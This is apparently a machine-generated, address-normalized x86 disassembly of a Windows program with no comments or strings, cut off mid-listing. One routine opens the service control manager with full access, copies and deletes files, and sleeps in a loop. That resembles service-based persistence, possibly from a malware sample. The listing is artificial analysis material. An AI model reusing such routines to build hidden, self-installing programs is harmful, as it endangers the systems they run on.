call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x48c ] 0x10
lea edx [ ebp - 0x4a0 ]
cmovae edx [ ebp - 0x4a0 ]
lea ecx [ ebp - 0x28 ]
call sub_414ee0
mov esi eax
lea eax [ ebp - 0x4a0 ]
cmp eax esi
je r-xdata
push [ ebp - 0x50 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x48c ] 0x10
jb r-xdata
cmp [ ebp - 0x474 ] 0x10
lea edx [ ebp - 0x488 ]
cmovae edx [ ebp - 0x488 ]
lea ecx [ ebp - 0x28 ]
call sub_414ee0
mov esi eax
lea eax [ ebp - 0x488 ]
cmp eax esi
je r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x4a0 ]
mov [ ebp - 0x48c ] 0xf
mov [ ebp - 0x490 ] 0x0
mov [ ebp - 0x4a0 ] 0x0
call sub_40c7e0
push [ ebp - 0x4a0 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x474 ] 0x10
jb r-xdata
cmp [ ebp - 0x48c ] 0x10
mov ebx [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
lea eax [ ebp - 0x4a0 ]
cmovae eax [ ebp - 0x4a0 ]
push eax
push 0x0
push 0xfde9
call ebx
mov edi eax
xor ecx ecx
lea esi [ edi + 0x1 ]
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_416889
add esp 0x4
mov [ ebp - 0x4a8 ] eax
push esi
push 0x0
push eax
call sub_41cae0
add esp 0xc
cmp [ ebp - 0x48c ] 0x10
push edi
push [ ebp - 0x4a8 ]
lea ecx [ ebp - 0x4a0 ]
cmovae ecx [ ebp - 0x4a0 ]
push edi
push ecx
push 0x0
push 0xfde9
call ebx
cmp [ ebp - 0x474 ] 0x10
push 0x0
push 0x0
push 0xffffffff
lea eax [ ebp - 0x488 ]
cmovae eax [ ebp - 0x488 ]
push eax
push 0x0
push 0xfde9
call ebx
mov edi eax
xor ecx ecx
lea esi [ edi + 0x1 ]
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_416889
add esp 0x4
mov ebx eax
push esi
push 0x0
push ebx
call sub_41cae0
add esp 0xc
cmp [ ebp - 0x474 ] 0x10
push edi
push ebx
push edi
lea ecx [ ebp - 0x488 ]
cmovae ecx [ ebp - 0x488 ]
push ecx
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x4a4 ]
push 0x80
push 0x0
push edi
call sub_41cae0
mov esi [ ebp - 0x4a8 ]
add esp 0xc
push esi
push ebx
push r--data
push 0x40
push edi
call sub_417b6e
add esp 0x14
push ebx
call j_sub_417912
add esp 0x4
push esi
call j_sub_417912
add esp 0x4
cmp [ ebp - 0x474 ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x488 ]
mov [ ebp - 0x474 ] 0xf
mov [ ebp - 0x478 ] 0x0
mov [ ebp - 0x488 ] 0x0
call sub_40c7e0
push [ ebp - 0x488 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x48c ] 0x10
mov [ ebp - 0x474 ] 0xf
mov [ ebp - 0x478 ] 0x0
mov [ ebp - 0x488 ] 0x0
jb r-xdata
push [ ebp - 0x488 ]
call j_sub_417912#2
add esp 0x4
mov ecx edi
lea edx [ ecx + 0x2 ]
push [ ebp - 0x4a0 ]
call j_sub_417912#2
add esp 0x4
jmp r-xdata
sub_415ab0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x21c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x218 ] eax
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x5
xor eax eax
push r--data
lea ecx [ esp + 0x110 ]
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x124 ] 0x7
mov [ esp + 0x120 ] 0x0
mov [ esp + 0x110 ] ax
call sub_408240
push 0x3
xor eax eax
push r--data
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x7
mov [ esp + 0x108 ] 0x0
mov [ esp + 0xf8 ] ax
call sub_408240
push 0xd
xor eax eax
push r--data
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc4 ] 0x7
mov [ esp + 0xc0 ] 0x0
mov [ esp + 0xb0 ] ax
call sub_408240
push 0xd
xor eax eax
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf4 ] 0x7
mov [ esp + 0xf0 ] 0x0
mov [ esp + 0xe0 ] ax
call sub_408240
push 0x5
xor eax eax
push r--data
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xdc ] 0x7
mov [ esp + 0xd8 ] 0x0
mov [ esp + 0xc8 ] ax
call sub_408240
xor eax eax
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] 0x0
mov [ esp + 0x78 ] ax
cmp [ esi ] ax
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
lea ecx [ esp + 0x80 ]
call sub_408240
push 0x6
push ecx
push r--data
lea ecx [ esp + 0x84 ]
call sub_408130
cmp eax 0xffffffff
setne bl
cmp [ esp + 0x8c ] 0x8
jb r-xdata
test bl bl
je r-xdata
push [ esp + 0x78 ]
call j_sub_417912#2
add esp 0x4
cmp [ esp + 0xbc ] 0x8
lea eax [ esp + 0xa8 ]
cmovae eax [ esp + 0xa8 ]
push eax
call sub_414bb0
lea ecx [ esp + 0x2b ]
call sub_409b20
push 0x0
push 0x0
push 0x0
push sub_40b100
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov esi [ Sleep@IAT ]
xor eax eax
push eax
push r--data
lea ecx [ esp + 0x68 ]
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] ax
call sub_408240
xor eax eax
push eax
push r--data
lea ecx [ esp + 0x50 ]
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
call sub_408240
push 0x5
xor eax eax
push r--data
lea ecx [ esp + 0x80 ]
mov [ esp + 0x94 ] 0x7
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] ax
call sub_408240
xor eax eax
push eax
push r--data
lea ecx [ esp + 0x98 ]
mov [ esp + 0xac ] 0x7
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] ax
call sub_408240
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x4c ]
push eax
lea eax [ esp + 0x80 ]
push eax
call sub_412260
mov edi [ OpenSCManagerW@IAT ]
test al al
je r-xdata
push 0x400
call esi
jmp r-xdata
push 0x0
push r--data
push [ esp + 0x60 ]
push ecx
lea ecx [ esp + 0x58 ]
call sub_414350
test eax eax
jne r-xdata
push 0x5
push r--data
push [ esp + 0xa8 ]
push ecx
lea ecx [ esp + 0xa0 ]
call sub_414350
lea edx [ esp + 0x48 ]
test eax eax
jne r-xdata
lea eax [ esp + 0xd8 ]
push eax
lea edx [ esp + 0x4c ]
lea ecx [ esp + 0x30 ]
call sub_416610
mov esi eax
lea eax [ esp + 0x64 ]
add esp 0x4
cmp eax esi
je r-xdata
lea eax [ esp + 0x48 ]
push eax
call sub_4117d0
mov ebx 0x2
push r--data
lea ecx [ esp + 0x14 ]
lea ebx [ eax + 0x1 ]
push r--data
lea ecx [ esp + 0x30 ]
jmp r-xdata
cmp [ esp + 0x40 ] 0x8
jb r-xdata
cmp [ esp + 0x74 ] 0x8
jb r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
cmp [ esp + 0x24 ] 0x8
jb r-xdata
call sub_416520
add esp 0x4
lea ecx [ esp + 0x60 ]
push eax
call sub_40b890
test bl 0x2
je r-xdata
cmp [ esp + 0x74 ] 0x8
lea eax [ esp + 0x2c ]
lea esi [ esp + 0x60 ]
cmovae esi [ esp + 0x60 ]
push eax
call sub_411710
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
xor eax eax
push esi
lea ecx [ esp + 0x64 ]
mov [ esp + 0x78 ] 0x7
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] ax
call sub_40cd80
push [ esp + 0x60 ]
call j_sub_417912#2
add esp 0x4
lea eax [ esp + 0x78 ]
push eax
call sub_4129e0
mov esi eax
lea eax [ esp + 0x108 ]
push eax
call sub_4129e0
cmp eax esi
jg r-xdata
cmp [ esp + 0x40 ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] ax
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
push 0x0
push esi
push eax
call [ CopyFileW@IAT ]
test eax eax
sete bl
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov eax [ eax ]
mov edx r--data
lea ecx [ esp + 0x90 ]
call sub_414030
test al al
je r-xdata
cmp [ esp + 0x74 ] 0x8
jb r-xdata
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
test bl bl
jne r-xdata
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push r--data
lea ecx [ esp + 0xac ]
call sub_408030
push r--data
lea ecx [ esp + 0xdc ]
call sub_408030
push r--data
lea ecx [ esp + 0xc4 ]
call sub_408030
lea eax [ esp + 0x60 ]
mov eax [ esp + 0x60 ]
test eax eax
jne r-xdata
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
push 0x0
call sub_419811
add esp 0x4
push eax
call sub_419982
add esp 0x4
call sub_41995f
cdq
mov ecx 0xf4240
idiv ecx
xor eax eax
push 0xfe
push eax
mov [ esp + 0x128 ] ax
lea eax [ esp + 0x12a ]
push eax
mov esi edx
call sub_41cae0
add esp 0xc
lea eax [ esp + 0x120 ]
push esi
push r--data
push eax
call sub_4166d0
add esp 0xc
lea eax [ esp + 0x120 ]
push eax
lea ecx [ esp + 0x14 ]
call sub_407fa0
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xac ]
push eax
lea eax [ esp + 0x68 ]
push eax
call sub_414790
test al al
sete bl
cmp [ esp + 0x24 ] 0x8
jb r-xdata
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_414930
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cmp [ esp + 0x8c ] 0x8
mov [ esp + 0xa4 ] 0x7
mov [ esp + 0xa0 ] 0x0
mov [ esp + 0x90 ] ax
jb r-xdata
push [ esp + 0x90 ]
call j_sub_417912#2
add esp 0x4
test bl bl
jne r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
lea ecx [ esp + 0x90 ]
call sub_408000
lea ecx [ esp + 0x78 ]
call sub_408000
lea ecx [ esp + 0x48 ]
call sub_408000
lea ecx [ esp + 0x60 ]
call sub_408000
xor esi esi
jmp r-xdata
xor eax eax
cmp [ esp + 0x5c ] 0x8
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] 0x0
mov [ esp + 0x78 ] ax
jb r-xdata
push [ esp + 0x78 ]
call j_sub_417912#2
add esp 0x4
lea eax [ esp + 0xf0 ]
push eax
lea eax [ esp + 0xc4 ]
push eax
lea eax [ esp + 0x110 ]
push eax
lea eax [ esp + 0x54 ]
push eax
call sub_411a90
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_414930
cmp [ esp + 0xd4 ] 0x8
jb r-xdata
xor eax eax
cmp [ esp + 0x74 ] 0x8
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] ax
jb r-xdata
push [ esp + 0x48 ]
call j_sub_417912#2
add esp 0x4
push eax
lea ecx [ esp + 0xac ]
call sub_4148a0
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ esp + 0xec ] 0x8
mov [ esp + 0xd4 ] 0x7
mov [ esp + 0xd0 ] 0x0
mov [ esp + 0xc0 ] ax
jb r-xdata
push [ esp + 0xc0 ]
call j_sub_417912#2
add esp 0x4
mov esi 0x1
push [ esp + 0x60 ]
call j_sub_417912#2
add esp 0x4
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_414930
xor eax eax
cmp [ esp + 0xbc ] 0x8
mov [ esp + 0xec ] 0x7
mov [ esp + 0xe8 ] 0x0
mov [ esp + 0xd8 ] ax
jb r-xdata
push [ esp + 0xd8 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ esp + 0x8c ] 0x8
mov [ esp + 0xa4 ] 0x7
mov [ esp + 0xa0 ] 0x0
mov [ esp + 0x90 ] ax
jb r-xdata
push [ esp + 0x90 ]
call j_sub_417912#2
add esp 0x4
mov esi [ Sleep@IAT ]
push 0xea60
call esi
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ esp + 0x104 ] 0x8
mov [ esp + 0xbc ] 0x7
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0xa8 ] ax
jb r-xdata
push [ esp + 0xa8 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ esp + 0x5c ] 0x8
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] 0x0
mov [ esp + 0x78 ] ax
jb r-xdata
push [ esp + 0x78 ]
call j_sub_417912#2
add esp 0x4
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_4149b0
xor eax eax
cmp [ esp + 0x11c ] 0x8
mov [ esp + 0x104 ] 0x7
mov [ esp + 0x100 ] 0x0
mov [ esp + 0xf0 ] ax
jb r-xdata
push [ esp + 0xf0 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ esp + 0x74 ] 0x8
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] ax
jb r-xdata
push [ esp + 0x48 ]
call j_sub_417912#2
add esp 0x4
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
mov ecx [ esp + 0x224 ]
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
push [ esp + 0x108 ]
call j_sub_417912#2
add esp 0x4
xor esi esi
jmp r-xdata
push [ esp + 0x60 ]
call j_sub_417912#2
add esp 0x4
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_4149b0
push r--data
lea ecx [ esp + 0x14 ]
call sub_407fa0
push 0xf003f
push 0x0
push 0x0
call edi
test eax eax
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
cmp [ esp + 0x24 ] 0x8
jb r-xdata
push eax
lea ecx [ esp + 0x14 ]
call sub_4149b0
push 0xea60
call esi
push r--data
lea edx [ esp + 0x4c ]
lea ecx [ esp + 0x30 ]
call sub_416520
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
mov esi [ DeleteFileW@IAT ]
push eax
call esi
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov eax [ eax ]
push r--data
lea edx [ esp + 0x4c ]
lea ecx [ esp + 0x30 ]
call sub_416520
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
push eax
call esi
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov eax [ eax ]
push r--data
lea edx [ esp + 0x4c ]
lea ecx [ esp + 0x30 ]
call sub_416520
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
push eax
call esi
cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov eax [ eax ]
push [ esp + 0x2c ]
call j_sub_417912#2
add esp 0x4
sub_416520
push ebp
mov ebp esp
push 0xffffffff
push sub_431039
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax edx
mov [ ebp - 0x14 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] 0x0
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov edi [ eax + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp [ ebx ] cx
je r-xdata
lea eax [ ecx + edi ]
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
mov ecx ebx
lea edx [ ecx + 0x2 ]
push 0xffffffff
push 0x0
push [ ebp - 0x14 ]
mov ecx esi
call sub_410f30
cmp [ ebx ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
mov ecx ebx
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
push 0x1
push eax
mov ecx esi
call sub_408460
test al al
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push ebx
mov ecx esi
call sub_410e00
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_416610
push ebp
mov ebp esp
push 0xffffffff
push sub_430ff9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
add eax [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_410f30
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_410f30
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_408460
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_4166e8
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_416712
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_4167b8
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_418b71
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_4167dd
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_418b71
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_4167fc
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_418b33
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41a87b
int3
sub_41682d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_418b0e
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41a87b
int3
sub_41685b
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_418b0e
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41a87b
int3
sub_416892
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_417032
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_4168c1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
test eax eax
jne r-xdata
cmp eax 0x4
jge r-xdata
push 0xc
call sub_41ad36
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_417049
pop ecx
sub_4168f4
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_417024
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_41691d
mov eax [ ecx ]
test eax eax
jne r-xdata
cmp eax 0x4
jge r-xdata
push 0xc
call sub_41ae9a
pop ecx
retn
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_417057
pop ecx
sub_416941
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
xor edx edx
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] al
push r--data
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_4169e2
mov eax esi
pop esi
pop ebp
retn 0x4
sub_416993
push esi
jmp r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov ecx esi
mov [ rw-data ] eax
call sub_41697e
push esi
call j_sub_417912#2
pop ecx
pop esi
retn
sub_4169b7
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_416aff
cmp [ esi + 0x18 ] 0x0
pop ecx
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x18 ]
call sub_417912
pop ecx
sub_4169e2
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx ] edi
je r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
cmp [ ebx ] 0x0
je r-xdata
and [ ebx ] 0x0
test edi edi
je r-xdata
push [ ebx ]
call sub_417912
pop ecx
cmp [ edi ] 0x0
push esi
mov esi edi
je r-xdata
sub esi edi
inc esi
push esi
call sub_41794a
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop esi
push esi
push edi
push eax
call sub_41a1a0
add esp 0xc
sub_416a36
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4169b7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_416a55
push ebp
mov ebp esp
push 0x8
call sub_41775f
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_416a83
push 0x4
mov eax sub_430188
call sub_41a8ea
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_4168c1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push esi
call sub_416bbd
mov esi eax
push esi
call sub_416bdc
pop ecx
pop ecx
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
call sub_4169e2
mov [ rw-data ] esi
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x10 ]
call sub_41691d
mov eax esi
call sub_41a8d6
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
sub_416aff
push 0x4
mov eax sub_430188
call sub_41a8ea
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_4168c1
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
push [ edi + 0x8 ]
call sub_417912
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_41691d
call sub_41a8d6
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_416b58
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_41aeaf
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x24 ]
call sub_4169e2
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_41aeaf
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x2c ]
call sub_4169e2
pop esi
pop ebp
retn
sub_416bbd
push ebp
mov ebp esp
push 0x20
call sub_41775f
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
mov ecx eax
call sub_416941
pop ebp
retn
sub_416c04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_416c23
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_4168c1
push rw-data
call sub_416c04
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_41691d
leave
retn
sub_416c4d
push ebp
mov ebp esp
push esi
call sub_41b274
mov esi [ ebp + 0x8 ]
push 0x2
push 0x100
mov [ esi ] eax
call sub_41b887
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
call sub_41b087
and [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] eax
push 0x200
call sub_41b087
push eax
push [ esi + 0x4 ]
call sub_41a1a0
add esp 0xc
mov [ esi + 0x8 ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
push eax
call sub_41b221
pop ecx
mov [ esi + 0xc ] eax
call sub_41b29a
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
sub_416cb9
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_41b29a
mov edi [ eax + 0x8 ]
call sub_41b274
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
